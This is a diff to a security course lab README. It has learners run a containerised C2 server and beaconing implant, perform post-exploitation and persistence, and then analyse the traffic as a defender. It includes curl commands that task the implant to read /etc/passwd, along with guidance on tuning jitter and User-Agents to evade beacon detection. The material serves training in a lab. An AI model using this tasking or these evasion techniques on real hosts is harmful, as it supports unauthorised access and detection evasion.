@@ -1,48 +1,115 @@
-# Lab 13 — Run an Open-Source C2
+# Lab 13 — Run a C2 Framework
 
 ## Setup
-Docker-first — a [Sliver](https://github.com/BishopFox/sliver) server, and a lab host to
-implant (a container or VM you own).
+
+```bash
+git clone https://github.com/plaintext-security/plaintext-labs.git
+cd plaintext-labs/offensive/13-c2-postex
+make up
+```
+
+The compose starts three containers:
+- **c2-server** — Flask-based C2 server (session manager + task queue)
+- **target** — simulated "compromised" host running the beacon implant
+- **operator** — operator console for running the demo
+
+The implant beacons every 5 seconds (±1s jitter), receives tasks, and returns output.
 
 ## Scenario
-Get a managed C2 session on a host in your lab and perform basic post-exploitation, watching
-what you generate on the wire.
 
-> Your own lab only.
+You've deployed an implant on a Meridian Financial application server. Use the C2
+framework to maintain access, enumerate the host, and establish persistence. Then
+switch hats: analyze what you left on the wire and how a defender would detect it.
+
+> **Authorization note:** Only deploy C2 implants on systems you own or have
+> explicit written authorisation to test. This container is intentionally set up
+> for this lab; never deploy implants on production systems.
 
 ## Do
-1. [ ] Stand up the Sliver server and a listener.
-2. [ ] Generate an implant, deliver it to your lab host, and catch the session.
-3. [ ] Post-ex: enumerate the host, collect something of interest, and establish a simple
-   persistence.
-4. [ ] Switch hats: capture the C2 traffic (Foundations networking) and note the beaconing
-   artifacts a defender would see.
+
+1. [ ] Run the demo to see the full C2 lifecycle:
+   ```bash
+   make demo
+   ```
+   Note the session ID, host info, and each post-ex command's output.
+
+2. [ ] Read `implant/beacon.py`. Trace the beacon loop:
+   - What data does each check-in POST to the server?
+   - How does the implant apply jitter, and why?
+   - What's the difference between the real UID and the username shown?
+
+3. [ ] Read `server/c2_server.py`. Understand the API:
+   - How does the server track active sessions?
+   - How does the task queue work (FIFO push/pop)?
+   - What does the operator see vs. what the implant sends?
+
+4. [ ] Shell into the operator container and interact with the C2 manually:
+   ```bash
+   make shell
+   # Get sessions:
+   curl http://c2-server:5000/api/sessions
+   # Queue a task (replace SID with your session ID):
+   curl -X POST http://c2-server:5000/api/task \
+     -H 'Content-Type: application/json' \
+     -d '{"sid":"<SID>","cmd":"cat /etc/passwd"}'
+   # Read results after 6s:
+   sleep 6 && curl http://c2-server:5000/api/results/<SID>
+   ```
+
+5. [ ] Analyze the beaconing pattern:
+   - Watch the beacon traffic: `docker compose logs target | head -30`
+   - What interval and jitter values make the beacon harder to score with RITA?
+   - Why does Cobalt Strike's "sleep" command with high jitter help evade RITA?
+
+6. [ ] Compare this minimal HTTP C2 to Sliver (read the [Sliver README](https://github.com/BishopFox/sliver)):
+   - What protocols does Sliver support (HTTP, DNS, mTLS, WireGuard)?
+   - Why is mTLS harder to inspect than cleartext HTTP?
+   - What is a "malleable C2 profile" and why does it matter for evasion?
 
 ## Success criteria — you're done when
-- [ ] You have a working C2 session and ran post-ex through it.
-- [ ] You established persistence and can explain it.
-- [ ] You can name two artifacts your C2 left for a defender (host or network).
+
+- [ ] You observed the implant check-in and captured the session ID.
+- [ ] You ran at least three post-ex commands via the task queue manually.
+- [ ] You can explain the beacon interval, jitter, and why both matter for detection.
+- [ ] You can compare this minimal C2 to Sliver on at least two dimensions (protocol, obfuscation).
 
 ## Deliverables
-`c2-postex.md`: the session setup, the post-ex you ran, the persistence, and the
-defender-visible artifacts.
 
-## AI acceleration
-Use a model to draft post-ex enumeration commands — then judge which are worth the noise before
-running them. The model lists options; you choose what's safe to do.
-
-## Connects forward
-The artifacts you generate here are exactly what Track 02 (detection) and Track 03 (forensics)
-hunt; persistence ties to Track 06.
-
-## Marketable proof
-> "I run an open-source C2 end to end — implant, session, post-exploitation, persistence — and
-> can articulate the telemetry it leaves for defenders."
+`c2-notes.md`: the session details, three post-ex outputs, and a comparison of this
+minimal C2 vs. Sliver — what does a real C2 add on protocol, evasion, and post-ex modules?
 
 ## Automate & own it
-**Required.** Script your implant generation and listener setup so an engagement is
-reproducible; AI drafts it, you review; commit it (no live implants in the repo).
+
+**Required.** Write an operator script `operator.py` that:
+- Connects to the C2 server API
+- Takes a session ID and a list of commands
+- Executes each command, waits for the result, and writes a timestamped log
+
+AI drafts the script; you review the API calls and timing logic. Commit `operator.py`
+alongside `c2-notes.md`.
+
+## AI acceleration
+
+Ask a model to explain the difference between a reverse shell and a C2 implant —
+specifically: what does the task/result channel add that a raw shell doesn't?
+Then verify against the Sliver documentation.
+
+## Connects forward
+
+A managed C2 session is the platform for Track 06 (Active Directory) attacks —
+Kerberoasting, DCSync, and credential dumping all run through post-ex modules in
+frameworks like Sliver or Cobalt Strike. The defensive inverse is Track 02's
+beacon-hunting module (12-hunting-network) — the same RITA scoring you ran.
+
+## Marketable proof
+
+> "I operate a C2 framework — establish sessions, run post-ex modules, plant
+> persistence — and can explain the beaconing artifacts and detection techniques
+> that surface it in a SOC."
 
 ## Stretch
-- Tune the implant's beacon interval and jitter, and explain how that changes the detection
-  picture.
+
+- Modify `implant/beacon.py` to add randomised User-Agent headers. Run RITA-style
+  beacon scoring from module 12 against the Zeek conn.log. Does the score change?
+- Replace the HTTP transport with HTTPS (self-signed cert). What changes in the
+  detection picture?
